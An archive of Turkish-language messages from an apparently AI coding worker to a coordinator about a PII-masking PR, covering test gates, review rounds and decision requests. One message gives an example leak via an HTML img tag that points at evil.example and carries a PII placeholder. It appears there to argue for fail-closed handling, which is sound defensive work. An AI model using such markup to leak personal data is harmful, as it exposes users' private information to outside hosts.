# Arşiv: isci-a · 08T1

state/kanal/isci-a.md'den taşınan mesajlar (bağlam bütçesi kararı, 16 Kasım 2026); içerik ve ID'ler değişmez, salt okunur.

### A-08T1-0001 · 2026-11-03 09:02 · → koordinator · DURUM
Paket: 08-tam-1   Cevap: -
DURUM: OKUMA-TAMAM (yeni oturum ffcore-isci-a-08-tam-1; lease ACTIVE)
Okunan gruplar: 1 FELSEFE + FELSEFE_UYGULAMA; 2 CLAUDE (yeni metin); 3 PLAN v2.10 (2d.7 PRSIM kararı, geçmiş 2.6-2.10); 4 KARARLAR (28 Ekim sonrası tüm eklemeler: 08-lite, C4/C7/C8-C10/C11 donmaları, egress tüm mesajlar, PRSIM M3 kararı A, NER adayları, yığın üç, model ağırlıkları offline); 5 handbook (CONTRACTS C2/C3/C6/C8/C9/C11 değişiklikleri, RELEASE downgrade notu, TERMINOLOGY); 6 WORK_QUEUE, BLOCKERS 83/106/107/118/141/147, kanallar (koordinator K-08T1-0001'e kadar, isci-a 06b-2 HANDOFF); 7 plan/08 tamamı + state/pr/08-lite.md (C4 donmuş biçim) + data/samples/pii (100 satır mevcut); 8 BASLATMA (soru penceresi yok kuralı).

### A-08T1-0002 · 2026-11-03 09:02 · → koordinator · ACK
Paket: 08-tam-1   Cevap: K-08T1-0001
GOREV alındı. Branch feat/08-tam-1-ner, worktree .worktrees/feat/08-tam-1-ner (main HEAD'den, 614c150+; ben açıyorum). Touch-zone WORK_QUEUE satırındaki gibi. Sıradaki: kaynak keşfi (guardrails/, masking detokenize, runtime çıkış sınırı, facade, core/egress, knowledge ingest_mask, cli ingest-raw) → state/pr/08-tam-1.md planı (felsefe üçlüsü, NER ölçüm yöntemi, volume/imaj kararı, bölme önerisi) → DURUM: PLANNED. Kod onaydan sonra. Ağırlık indirme bende değil: `make models` NER hedefini yazarım, kullanıcı koşturur.

### A-08T1-0003 · 2026-11-03 09:12 · → koordinator · DURUM
Paket: 08-tam-1   Cevap: K-08T1-0001
DURUM: PLANNED talebi. Plan: C:\ai_paycore\ffcore\state\pr8-tam-1.md (bulunan semboller, C17 çıkış haritası kaynakta doğrulanmış, kabul → test 1-17, felsefe üçlüsü). Worktree .worktrees/feat/08-tam-1-ner @ ea0db36 açıldı; kod yok.
Oturum notu (K-09-0002 emsali için): bu oturum kullanıcının 28 Ekim okuma oturumundan açtığı fork; 28 Ekim sonrası değişen kural belgelerini (KARARLAR, PLAN 2.10, CONTRACTS, BASLATMA, CLAUDE) git diff 8ba004c..HEAD ile yeniden okudum. Kullanıcı ROL/PAKET'i bu fork'a açıkça verdi.
Onay istediğim 9 nokta (planda A/B/C, önerim hepsinde A): S1 Presidio eklenmez (transformers zaten bağımlılık); S2 NER modeli yalnız API'de, worker ve ingest `POST /internal/ner` ile (04a embed deseni); S3 `NER_MODEL`/`NER_REVISION` açık değer, `:?`; S4 ağırlık `model_cache` volume (brief "imaja gömülür" ↔ KARARLAR 04a: KARARLAR kazanır, DRIFT adayı); S5 lisans ve TabiBERT NER başlığı doğrulanmadı: kullanıcının `make models`'ı model kartlarını da indirir, offline okurum; S6 `tests/e2e/scenarios/seed.py` secrets geri alma bu PR'da (touch-zone genişletmesi); S7 **bölme: 08-tam-1a (C17+106+107+147, modelsiz, hemen) + 08-tam-1b (NER+PRSIM, ağırlıklar gelince)**; S8 geri çevrilmiş değer yalnız koşu sahibine/facade çağırana, diğer okuyucular yer tutucu görür; S9 TTL dolunca yer tutucu kalır + `detokenize_unresolved` logu, GET uçları tokenize kalır.
Bulgu: GOREV "CONTRACTS C17" diyor, CONTRACTS'ta C17 yok (C1-C14); plan/08 kabul maddesi anlamında uyguluyorum (DRIFT adayı).
S7 A onaylanırsa ilk iş 1a dilim 1 (147, önce kırmızı test); yığın 1a'nın entegrasyon kapısında YIGIN-AÇ ile.

### A-08T1-0004 · 2026-11-03 09:14 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0002
Alındı: S1-S9 A, 1a önce (147 → 106 → 107 + seed → C17 → kapılar → PR-HAZIR). Branch feat/08-tam-1-ner 1a için kullanılıyor (1b ayrı branch/oturum, 1a merge'ünde karar). Kodlama başladı; yığın entegrasyon kapısında YIGIN-AÇ ile.

### A-08T1-0005 · 2026-11-03 09:55 · → koordinator · YIGIN-AÇ ffcore-08t1
Paket: 08-tam-1a   Cevap: K-08T1-0002
Yığın: compose proje ffcore-08t1, yalnız postgres + redis (make test-int için; port yayını yok, BACKEND_PORT 18270 gerekirse). Ölçüm 09:54: C: 99 GB boş; docker stats toplamı 5,5 GiB, Docker VM 11,7 GiB; açık FF yığını yalnız ffcore-18k2. İmaj ffcore/tools:0.0.0-08t1 (yalnız tools, bağımlılık değişmedi). İlerleme: 147 (e46e4ca), 106 (ee0d6ca), 107 + seed (b193c54), C17 yardımcıları (fdcbecd) commit'li; C17 çıkış sınırı bağlandı, birim 920+ yeşil, entegrasyon testleri yazılıyor.

### A-08T1-0006 · 2026-11-03 10:36 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0003
Takılma yok. HEAD 675f857 (5 commit: 147 e46e4ca, 106 ee0d6ca, 107+seed b193c54, C17 yardımcıları fdcbecd, C17 çıkış sınırı 675f857); tam SHA PR-HAZIR'da.
Kapılar: make lint 0; make test llmaas 1009/1009, airgap 1009/1009; C17 entegrasyon (gerçek Postgres+Redis; LiteLLM+fake sağlayıcı) + 06b direct + 06b2 external 57/57. make test-int iki profil şu an arka planda (yığın postgres+redis+litellm+fake-llm; langfuse/qdrant açılmadı: f19r tam yığını + airflow belleği).
Plana iki ek varsayım (görüş istiyorum, bloklamıyor; state/pr/08-tam-1a.md varsayım 1-2): (1) hizalama yazma tarafında: model düğümü canlı token girdisini yer tutucu ortasında bitirmez, okuyucu girdi başına durumsuz geri çevirir (okuma tarafı tamponu tutulan kuyruğu Last-Event-ID yeniden bağlanmasında kaybederdi); (2) çıkışta enforce bir pii kuralı varsa geri çevirme yok (yoksa output.pre'nin gizlediği değer açılırdı; test_06b_4 bunu yakalıyordu).
Kalan: test-int sonuçları → kapı tablosu → down -v + YIGIN-KAPA → PR-HAZIR. F11 e2e (P5) NOT_RUN, test rolünün yığınında (S6).

### A-08T1-0007 · 2026-11-03 11:28 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0004 (zil; kanal kopyasını henüz görmedim)
test-int llmaas (HEAD 675f857, 25 dk): 798 passed, 5 skipped, **8 failed + 3 error, hepsi ortam**: yalın yığında olmayan servisler. test_02_langfuse (3: langfuse yok, DNS), test_05a_live_services (5: mcp-search/mcp-sql konteyneri yok, egress_dns_failed), test_18td_tools_api (3 error: ticket-desk yok). Benim değiştirdiğim alanlarda kırmızı yok (C17/06b/06b2/08/134/03c dahil). airgap koşusu sürüyor.
Neden yalın yığın: tam yığın açtığımda f19r tam yığını + airflow vardı, bellek koşulu tutmuyordu; şimdi review19r tam yığını açık, toplam 8,1/11,7 GiB.
K-08T1-0004 ekleri (detokenize_skipped_policy sayaç logu + docs cümlesi) test-int bittikten sonra eklenecek (koşu worktree kodunu bind-mount ile görüyor, araya kod sokmuyorum); ardından kapılar son SHA'da yeniden.
Öneri (karar senin): A (önerim) son SHA'da make test iki profil + test-int iki profil yalın yığınla, kalan 3 dosya (02, 05a live, 18td) NOT_RUN ortam gerekçesiyle; benim değişikliğim o servislerin yoluna dokunmuyor (02 izleme, 05a MCP aktarıcıları, 18td ticket-desk). B: o 3 dosya için langfuse + mcp-* + ticket-desk eklenir (~2 GB; review19r kapanınca). C: tam yığını review19r kapanınca baştan.

### A-08T1-0008 · 2026-11-03 11:35 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0004 / K-08T1-0005
K-08T1-0004 ekleri commit fb7130d6fda59b2b62fbecf50e47b7ebd1a15bdf: `detokenize_skipped_policy scope=<id> count=<n>` (konsol sahibi, facade agent, facade düz tek parça + canlı akış), docs/guardrail.md + docs/agentlar.md cümlesi; yazma tarafı hizalama testleri (sağlayıcı yer tutucuyu iki delta'da veriyor → çıkışta ham parça yok) zaten var, Last-Event-ID gerekçesi PR varsayım 1'de.
Önceki airgap test-int'te 3 yeni kırmızı benim testimdeydi (test_08t_c17_facade_direct: egress kapalıyken tokenize yok, test profili hesaba katmıyordu); test iki profile göre düzeltildi, iki profilde 6/6.
Şimdi son SHA'da tüm kapılar arka planda: lint, make test ve test-int, iki profil (~70 dk). K-08T1-0005 A: 02/05a-live/18td NOT_RUN ortam gerekçeli. Bitince kapı tablosu → down -v + YIGIN-KAPA → PR-HAZIR.

### A-08T1-0009 · 2026-11-03 12:33 · → koordinator · YIGIN-KAPA ffcore-08t1
Paket: 08-tam-1a   Cevap: K-08T1-0003
`docker compose -p ffcore-08t1 ... --profile test --profile qdrant down -v` exit 0; kalan konteyner 0, volume 0. Yerel imajlar ffcore/tools:0.0.0-08t1 ve ffcore/backend:0.0.0-08t1 duruyor (temizlik listesine).

### A-08T1-0010 · 2026-11-03 12:33 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0005
DURUM: VERIFIED talebi. HEAD fb7130d6fda59b2b62fbecf50e47b7ebd1a15bdf (baz ea0db36, 6 commit, ağaç temiz, push yok). Son SHA'da: lint 0; make test llmaas 1010/1010, airgap 1010/1010; test-int llmaas 798 passed / airgap 796 passed, kırmızılar yalnız K-08T1-0005 A'daki üç ortam dosyası (02 langfuse, 05a live, 18td; DNS/bağlantı). C17 entegrasyon dosyaları iki profilde 6/6. F11 e2e NOT_RUN (S6, test rolü).

### A-08T1-0011 · 2026-11-03 12:33 · → koordinator · PR-HAZIR
Paket: 08-tam-1a   Cevap: K-08T1-0002
PR: C:\ai_paycore\ffcore\state\pr\08-tam-1a.md · Branch: feat/08-tam-1-ner · SHA: fb7130d6fda59b2b62fbecf50e47b7ebd1a15bdf · Sınıf: [B] · push yok. Güvenlik turu zorunlu (PR'da "Güvenlik turu için notlar"). 08-tam-1b (NER + PRSIM) ayrı PR; ağırlıklar ve oturum kararı 1a merge'ünde.

### A-08T1-0012 · 2026-11-03 12:33 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: A-08T1-0011
Düzeltme: A-08T1-0011'deki PR yolu kaçış hatasıyla bozuk yazıldı. Doğrusu: C:\ai_paycore\ffcore\state\pr\08-tam-1a.md. SHA ve diğer alanlar aynı (fb7130d6fda59b2b62fbecf50e47b7ebd1a15bdf).

### A-08T1-0013 · 2026-11-03 12:35 · → koordinator · KARAR-GEREK
Paket: 08-tam-1b   Cevap: K-08T1-0007
Alındı; feat/08-tam-1-ner donuk, commit yok. `make models` NER hedefi **hazır değil**: 1b kodudur, henüz yazılmadı (1a dalında değil).
Ağırlık indirmesi kullanıcıya bağlı ve 1b'nin kritik yolu. Öneri:
- **A (önerim):** 1b'yi şimdi ayrı dalda başlat: `feat/08-tam-1b-ner` (main'den, 1a koduna bağımlı değil), ilk ve tek dilim yalnız indirme hedefi: `knowledge/models.py` `required()`/`download()`'a NER adayları (savasy/bert-base-turkish-ner-cased, akdeniz27/bert-base-turkish-cased-ner; TabiBERT'in NER başlıklı hazır modeli varsa o da), model kartı (README.md) ve config.json dahil, revizyon `main` ile indirilip gerçek revizyon models.txt'e kullanıcının çıktısından yazılır; birim testi indirme yapmaz. Bunu küçük commit olarak verip kullanıcı `make models`'ı koşarken 1a review'u sürer. Bedel: aynı oturumda ikinci paket (kullanıcı kuralı "paket başına yeni oturum"; istisna senin/kullanıcının kararı).
- B: 1a merge'ünü bekle, 1b yeni oturumda baştan. Bedel: indirme ve ölçüm 1a review'u kadar gecikir.
- C: indirme komutunu ben yazmadan kullanıcı `huggingface-cli download` ile elle indirsin. Bedel: models.txt/`make models` deseninin dışında, offline manifest elle tutulur (ARCH-10'a ters).
Lisans ve id2label model kartından offline okunur (S5); kapalı lisans çıkarsa dururum.

### A-08T1-0014 · 2026-11-03 12:36 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0008
Karar B alındı: bu oturumda 1b yok, başka dal açılmıyor. feat/08-tam-1-ner @ fb7130d donuk. DUZELT gelirse uygulayıp yeni tam SHA ile PR-HAZIR; ONAY ve merge sonrası HANDOFF (1b notları: NER aday listesi, S1-S5 kararları, worker/ingest için /internal/ner deseni) + lease RETIRED.

### A-08T1-0015 · 2026-11-03 14:29 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0009
DUZELT r1 alındı (MAJOR 1-7, MINOR 1/2/3/7/8/11/12 bu turda; kalan MINOR ve NOTE FOLLOWUP-162). state/reviews/08-tam-1a-r1.md ve KARARLAR'daki iki karar okunuyor; MAJOR'lar ayrı commit, önce kırmızı test, feat/08-tam-1-ner üstüne; yeni tam SHA ile PR-HAZIR.

### A-08T1-0016 · 2026-11-03 14:38 · → koordinator · YIGIN-AÇ ffcore-08t1
Paket: 08-tam-1a   Cevap: K-08T1-0009
r1 düzeltmeleri için yalın yığın: postgres + redis + litellm + fake-llm + qdrant (`--profile test --profile qdrant`, yalnız bu servisler; port yayını yok). İlerleme: MAJOR-4 298cce3, MAJOR-5 852a1fb, MAJOR-6 commit'li; MAJOR-7 testi yazıldı, sırada MAJOR-1/2/3 ve MINOR'lar.

### A-08T1-0017 · 2026-11-03 14:53 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0009
r1 ilerleme (her biri ayrı commit, önce kırmızı): MAJOR-4 298cce3, MAJOR-5 852a1fb (08 r3 ölçümleri değişmedi), MAJOR-6 commit'li, MAJOR-7 bd0f0d1, MAJOR-1 90dca7f (sayaç ayrı uzun ömürlü anahtarda, lookup TTL yeniler, reserve), MAJOR-2 5083e5e (geçmiş eski kapsamda çözülür, yeni kapsam sayacı taşınan numaranın üstünden başlar; facade agent istemci geçmişini egress öncesi metinle saklar: run_id'siz satırdaki yer tutucu hiçbir kapsamda çözülemezdi, graph egress her model çağrısında tokenize ediyor). Sırada MAJOR-3 (URL bağlamı), sonra MINOR'lar.

### A-08T1-0018 · 2026-11-03 15:16 · → koordinator · DURUM
Paket: 08-tam-1a   Cevap: K-08T1-0009
Bekleyen karar yok; DUZELT turunun kodu bitti. HEAD 6d0d9ba0aa0efcf04eddf9409d36e42f16053f55 (fb7130d üstüne 9 commit): MAJOR-3 1850df3 (URL/markdown bağlamında geri çevirme yok, `detokenize_skipped_url`; aynı commit'te MINOR-3 JSON kaçışı, MINOR-8 olumlu testler, MINOR-11 `detokenize_unavailable` hata olayı, MINOR-12 docs), MINOR-1/2 1a36dfa, MINOR-7 6d0d9ba (gerçek resume_run + GET /stream). Kalan MINOR/NOTE PR'da FOLLOWUP-162 kısıtı olarak.
Şu an son SHA'da kapılar arka planda (lint, make test ve test-int iki profil); bitince kapı tablosu → PR-HAZIR. state/pr/08-tam-1a.md'de "Review r1 bulgu → düzeltme → kanıt" tablosu hazır.

### A-08T1-0019 · 2026-11-03 15:56 · → koordinator · YIGIN-KAPA ffcore-08t1
Paket: 08-tam-1a   Cevap: K-08T1-0011
`down -v` exit 0; konteyner 0, volume 0.

### A-08T1-0020 · 2026-11-03 15:56 · → koordinator · PR-HAZIR
Paket: 08-tam-1a   Cevap: K-08T1-0009
r1 DUZELT uygulandı. PR: C:\ai_paycore\ffcore\state\pr\08-tam-1a.md ("Review r1 bulgu → düzeltme → kanıt" tablosu, FOLLOWUP-162 kısıtları, r2 kapı tablosu) · Branch: feat/08-tam-1-ner · SHA: 6d0d9ba0aa0efcf04eddf9409d36e42f16053f55 (fb7130d üstüne 9 commit) · Sınıf: [B] · push yok.
Kapılar (son SHA): lint 0; make test llmaas 1046/1046, airgap 1046/1046; test-int llmaas 813 / airgap 811 passed, kırmızılar yalnız K-08T1-0005 A'daki üç ortam dosyası. MAJOR-1..7 ve MINOR 1/2/3/7/8/11/12 testli; yeni testlerin kırmızısı düzeltme öncesi kodla koşularak gösterildi (MAJOR-3 birim testi import hatasıyla kırmızıydı).
İnceleyiciye not: facade agent istemci geçmişi satırları artık egress öncesi metinle saklanıyor (MAJOR-2 gereği; run'sız satırdaki yer tutucu hiçbir kapsamda çözülemezdi), sayaç anahtarı 400 gün; ikisi PR "Bilinen sınırlar"da.

### A-08T1-0021 · 2026-11-03 15:58 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0013
Alındı: 6d0d9ba VERIFIED, r2 delta incelemede. Dal donuk, commit yok; sonuca kadar bekliyorum.

### A-08T1-0022 · 2026-11-03 17:15 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0014
Alındı: r2 DUZELT (MAJOR-r2-1/2/3, MINOR-r2-1..7, NOTE-1). KARARLAR'daki iki yeni karar (URL satır düzeyinde fail-closed; geçmiş eşlemesi doğrudan ve hamsız) bağlayıcı kabul. Sıra: MAJOR-r2-1 → r2-2 (+MINOR-r2-1) → r2-3 (+MINOR-r2-4) → MINOR-r2-2/3 → docs/PR notu; her biri önce kırmızı test, ayrı commit. Kanıt: lint, make test iki profil, hedefli test-int iki profil (yalın yığın, YIGIN-AÇ/KAPA).

### A-08T1-0023 · 2026-11-03 18:20 · → koordinator · YIGIN-AÇ
Paket: 08-tam-1a r2 DUZELT
Yalın yığın açılıyor: proje ffcore-08t1, postgres + redis + litellm + fake-llm + qdrant (`--profile test --profile qdrant`), imaj 0.0.0-08t1. Disk 93 GB boş; çalışan başka konteyner yok. Hedefli test-int iki profil; bitince YIGIN-KAPA.

### A-08T1-0024 · 2026-11-03 18:55 · → koordinator · DURUM
Paket: 08-tam-1a r2 DUZELT   Cevap: K-08T1-0014
4 commit (6d0d9ba üstüne): 87b7e7b MAJOR-r2-1 (URL satır kuralı, alt satıra taşan hedef, 8.192 fail-closed), e2c32b2 MAJOR-r2-2/3 + MINOR-r2-1/4 (geçmiş doğrudan eşleme `i:` kimliğiyle, hamsız; reserve_carried dört yolda; ≤ 8 hane; geçmiş okuması TTL yenilemez), 07279b1 MINOR-r2-2/3, 370912d docs. Kırmızı kanıtı: yeni testler 6d0d9ba koduyla 118 kırmızı. Hedefli test-int iki profilde 22/22 yeşil (min_confidence 0,8 uçtan uca dahil). Şimdi kapılar (lint 0; make test iki profil koşuyor), sonra hedefli test-int iki profil ve PR-HAZIR.
Not (PR varsayım 9): akışta satırın işaretinden önce gönderilmiş yer tutucu geri alınamaz; tek parça metinde satırın hepsi tutulur. Hedefteki yer tutucu her durumda tutulur. Satır tamponu istenirse tek değişiklik.

### A-08T1-0025 · 2026-11-03 19:10 · → koordinator · YIGIN-KAPA
Paket: 08-tam-1a r2 DUZELT
ffcore-08t1 yalın yığını `down -v` ile kapandı; ffcore-08t1 konteyner 0, volume 0. Başka yığına dokunulmadı.

### A-08T1-0026 · 2026-11-03 19:11 · → koordinator · PR-HAZIR
Paket: 08-tam-1a r3   Cevap: K-08T1-0014
SHA: 370912d914df97eb1b7682e40f4df061369a7a54 (feat/08-tam-1-ner; 6d0d9ba üstüne 4 commit, 19 dosya +1060/-136; main...HEAD 41 dosya, 19 commit). PR notu: state/pr/08-tam-1a.md ("Review r2 bulgu → düzeltme → kanıt" tablosu, r3 kapı tablosu, varsayım 9-11).
Kapılar: lint 0; make test llmaas 1210 / airgap 1210; hedefli test-int llmaas 138 passed, airgap 136 passed + 2 skipped (profil koşullu); kırmızı kanıtı 6d0d9ba koduyla 118 kırmızı.
MAJOR-r2-1/2/3, MINOR-r2-1..7, NOTE-1 kapalı (her biri testli). İnceleyiciye üç not: (1) akışta satır işaretinden önce gönderilmiş yer tutucu geri alınamaz, hedeftekiler her durumda tutulur (varsayım 9, karardan dar sapma); (2) açık kalan hedef sonraki satıra taşınır (karara ek, varsayım 10); (3) MINOR-r2-1'in "eski kapsamın aralığı" tercihi uygulanmadı, yalnız ≤ 8 hane (gerekçe tabloda). İnceleyicinin int probe'u (`08-tam-1a-r2-int-probe.py`) bu yığında koşulmadı; aynı senaryolar test_08t_r2_paths ve test_08t_m2_facade_history'de test olarak var. Dal donuk; r3 sonucunu bekliyorum.

### A-08T1-0027 · 2026-11-03 18:00 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0017
Alındı: 370912d VERIFIED, r3 delta incelemede; dal donuk, commit yok. Saat damgası notu alındı: A-08T1-0023..0026 damgaları gerçek saatten ~75 dk ileri yazılmıştı; bundan sonra `date` ile yazıyorum. Sonucu bekliyorum.

### A-08T1-0028 · 2026-11-03 19:45 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0018
Alındı: r3 DUZELT (MAJOR-r3-1/2, MINOR-r3-1..6/8, NOTE-1/2). KARARLAR "C17 URL bağlam kuralı, ek" (a)-(f) bağlayıcı kabul. Sıra: MAJOR-r3-2 (artımlı tarama) → MAJOR-r3-1 (HTML etiketi satırı + şema/style/data/url( + satır sonunda öznitelik adı) → MINOR-r3-4 (boş satır sıfırlar) → MINOR-r3-1 (yeniden bağlanan okuyucu) → MINOR-r3-2 (99.999.998) → MINOR-r3-3/6 → NOTE-1 → docs + PR notu. Her biri önce kırmızı test, ayrı commit.

### A-08T1-0029 · 2026-11-03 19:54 · → koordinator · KARAR-GEREK
Paket: 08-tam-1a r3   Cevap: K-08T1-0018 (MINOR-r3-4, KARARLAR ek (e))
Durum: MAJOR-r3-2 (1d6e84e) ve MAJOR-r3-1 (0ad2aab) commit'li, testli. (e) uygulanmadan önce bir sızıntı yolu gördüm: HTML tırnaklı öznitelik değeri boş satırı geçebilir ve tarayıcı URL'deki satır sonlarını siler. `<img src="https://evil.example/?q=` + boş satır + `<<PII_1>>">`: 1. satır işaretli; (e) boş satırda açık hedefi kapatırsa 3. satırda işaret yok (şema/etiket 1. satırda kaldı), değer açılır ve dış hosta gider. Kararın gerekçesi ("sonraki satırlarda şema/etiket kuralları yine geçerli") bu biçimde tutmuyor; CommonMark gerekçesi yalnız markdown hedefleri için doğru.
Seçenekler:
- **A (önerim):** boş satır yalnız markdown kaynaklı açık hedefi kapatır (`](` paren, `](<`, `]:` sonrası değer bekleniyor). HTML kaynaklı olanlar (açık etiket, etiket içi ya da öznitelik sonrası tırnak, `=` sonrası değer) kapanış karakterine kadar sürer. `_lost` (8.192'yi aşan işaretli satır) boş satırla kapanmaz; durum bilinmiyor. Etki: raporun kullanılabilirlik örnekleri (`[not]: 'tis`, kapanmayan markdown) boş satırla düzelir; HTML'de kapanmayan tırnak cevabın sonuna kadar fail-closed kalır; sızıntı yok.
- **B:** (e) yazıldığı gibi; boş satır her şeyi kapatır. Etki: yukarıdaki yazım ham HTML işleyen istemcide açık kalır (MAJOR-r2-1 sınıfı).
- **C:** sıfırlama yok (r3 davranışı). Etki: sızıntı yok, kullanılabilirlik sorunu MINOR-r3-4 olduğu gibi kalır.
Cevaba kadar diğer maddelerle (MINOR-r3-1/2/3/6, NOTE-1, docs) devam ediyorum; MINOR-r3-4 en sona kaldı.

### A-08T1-0030 · 2026-11-03 19:55 · → koordinator · KARAR-GEREK
Paket: 08-tam-1a r3   Cevap: K-08T1-0018 (MINOR-r3-1, KARARLAR ek (d))
(d) yazıldığı gibi ("`after` ile başlayan okuyucunun ilk satırı fail-closed") konsolun onay sonrası yolunu da kapsıyor: konsol onaydan sonra `stream_after` ile yeniden bağlanıyor. Bu yüzden koşu sahibi onay sonrası cevabın ilk satırındaki değerleri yer tutucu görür; tek satırlık cevapta hiç değer görmez. Facade agent'ın `X-Resume-Run-Id` yolu da aynı. Mevcut `test_08t_m7_owner_sees_values_approver_and_admin_placeholders` bu yüzden kırmızıya döner (sahip onaydan sonra `Kayıt sahibi <<PII_1>>.` görür).
Seçenekler:
- **A (önerim):** yeniden bağlanan okuyucu, `after`'a kadarki saklanan `token` girdilerini geri çevirmeden `UrlLines`'tan geçirir ve satır durumunu yeniden kurar. İlk okuyucu tam bu durumu görmüştü. Kurulamazsa (okuma hatası, girdi bulunamadı) ilk satır fail-closed olur, yani (d). Etki: sızıntı yok; onay sonrası değerler görünür. Maliyet: koşunun önceki token metnini bir kez taramak (artımlı tarama, ucuz).
- **B:** (d) yazıldığı gibi. Etki: onay sonrası ilk satır ve yeniden bağlanmada ilk satır her zaman yer tutucu; m7 testi beklentisi değişir; docs'a yazılır.
- **C:** (d) yalnız `after` bir `token` girdisiyse uygulanır. Onay ya da soru olayından sonra ilk satır temiz sayılır. Etki: modelin onaydan önce yazdığı yarım satır onaydan sonra devam ederse açık kalır (dar ama sızıntı yolu).
Bekleyen iki karar (A-08T1-0029 (e), bu) dışındaki maddelerle devam ediyorum.

### A-08T1-0031 · 2026-11-03 19:59 · → koordinator · YIGIN-AÇ
Paket: 08-tam-1a r3 DUZELT
Yalın yığın açılıyor: ffcore-08t1, postgres + redis + litellm + fake-llm + qdrant (`--profile test --profile qdrant`), imaj 0.0.0-08t1. Hedefli test-int iki profil; bitince YIGIN-KAPA.

### A-08T1-0032 · 2026-11-03 20:28 · → koordinator · YIGIN-KAPA
Paket: 08-tam-1a r3 DUZELT
ffcore-08t1 yalın yığını `down -v` ile kapandı; konteyner 0, volume 0.

### A-08T1-0033 · 2026-11-03 20:28 · → koordinator · PR-HAZIR
Paket: 08-tam-1a r4   Cevap: K-08T1-0018, K-08T1-0020, K-08T1-0021
SHA: 4aecdbc327a3a85e328045bf103b3d186c66ace9 (feat/08-tam-1-ner; 370912d üstüne 9 commit, 19 dosya +801/-98; main...HEAD 47 dosya, 28 commit). PR notu: state/pr/08-tam-1a.md ("Review r3 bulgu → düzeltme → kanıt" tablosu, r4 kapı tablosu, varsayım 12-13).
Kapılar: lint 0; make test llmaas 1382 / airgap 1382; hedefli test-int airgap 146 passed + 2 skipped; llmaas 147 passed + 1 kırmızı. Kırmızı `<span style="background:url(…)">` yazımındaydı: fake sağlayıcı cevabı kesiyor, yer tutucu da değer de cevaba ulaşmıyordu, sızıntı yok. Test beklentisini sağlayıcıya giden istek ve cevap üzerinden doğrulayacak biçimde düzelttim (4aecdbc); dosya iki profilde 12/12 yeşil.
MAJOR-r3-1/2, MINOR-r3-1..6/8, NOTE-1/2 kapalı; MINOR-r3-7, NOTE-3/5 FOLLOWUP-162. Kırmızı kanıtı commit öncesi kodla alındı (PR notunda dosya başına sayılar).
İnceleyiciye iki not: (1) varsayım 12: (d) için yalnız son satır değil, `after`'a kadarki bütün token girdileri taranıyor. Önceki satırdan taşınan HTML değeri ancak böyle tutuluyor (testli). (2) varsayım 13: HTML'de `src=<x` artık açılı hedef sayılmıyor; böylece (e) markdown/HTML ayrımıyla tutarlı. Dal donuk; r4 sonucunu bekliyorum.

### A-08T1-0034 · 2026-11-03 20:29 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0023
Alındı: 4aecdbc VERIFIED, r4 delta incelemede; dal donuk, commit yok. Sonucu bekliyorum.

### A-08T1-0035 · 2026-11-03 21:11 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0024
Alındı: r4 DUZELT (MAJOR-r4-1 karar A, MINOR-r4-1..6, NOTE-6). KARARLAR "C17 geri çevirme: cevap düzeyinde HTML fail-closed" ile (d′)/(f′) bağlayıcı kabul. Sıra: MAJOR-r4-1 (cevap düzeyinde HTML, tag/tırnak/expect kipleri ve öznitelik taşıması kalkar, CR bekletme) → MINOR-r4-3/6 (hazırlık hatası `_lost`) → MINOR-r4-2 (99.999.999) → MINOR-r4-1 (motorda fail-loud) → MINOR-r4-4 → docs/PR notu. Her biri önce kırmızı test, ayrı commit.

### A-08T1-0036 · 2026-11-03 21:19 · → koordinator · YIGIN-AÇ
Paket: 08-tam-1a r4 DUZELT
Yalın yığın açılıyor: ffcore-08t1, postgres + redis + litellm + fake-llm + qdrant, imaj 0.0.0-08t1. Hedefli test-int iki profil; bitince YIGIN-KAPA.

### A-08T1-0037 · 2026-11-03 21:43 · → koordinator · YIGIN-KAPA
Paket: 08-tam-1a r4 DUZELT
ffcore-08t1 yalın yığını `down -v` ile kapandı; konteyner 0, volume 0.

### A-08T1-0038 · 2026-11-03 21:43 · → koordinator · PR-HAZIR
Paket: 08-tam-1a r5   Cevap: K-08T1-0024
SHA: 60f2250caf8fa089abb0ee476b7a0325394d3c44 (feat/08-tam-1-ner; 4aecdbc üstüne 5 commit, 14 dosya +282/-188; main...HEAD 48 dosya, 33 commit). PR notu: state/pr/08-tam-1a.md ("Review r4 bulgu → düzeltme → kanıt" tablosu, r5 kapı tablosu, varsayım 14-15).
Kapılar HEAD'de: lint 0; make test llmaas 1505 / airgap 1505; hedefli test-int llmaas 149 passed, airgap 147 passed + 2 skipped. Kırmızı kanıtı commit öncesi kodla: html_response 96, resume 3, range 4.
MAJOR-r4-1 karar A ile kapandı: HTML artık cevap düzeyinde; tag/tırnak/expect/CSS kipleri ve öznitelik taşıması kalktı (masking.py net 43 satır küçüldü); CR bekletiliyor. MINOR-r4-1..6 ve NOTE-6 kapalı; NOTE 1/2/4/5 ve r3 NOTE-4 FOLLOWUP-162 kısıtı olarak PR notunda.
İnceleyiciye not (varsayım 14): `](<a b>)` içindeki `<a` HTML etiketi sayılıyor, cevabın kalanı tutuluyor (fail-closed). Açılı hedefin ilk karakteri harf değilse yalnız markdown kuralı geçerli. r5 odağı markdown ve CRLF. Dal donuk; sonucu bekliyorum.

### A-08T1-0039 · 2026-11-03 21:45 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0027
Alındı: 60f2250 VERIFIED, r5 delta incelemede; dal donuk, commit yok. Sonucu bekliyorum.

### A-08T1-0040 · 2026-11-03 22:28 · → koordinator · ACK
Paket: 08-tam-1a   Cevap: K-08T1-0028
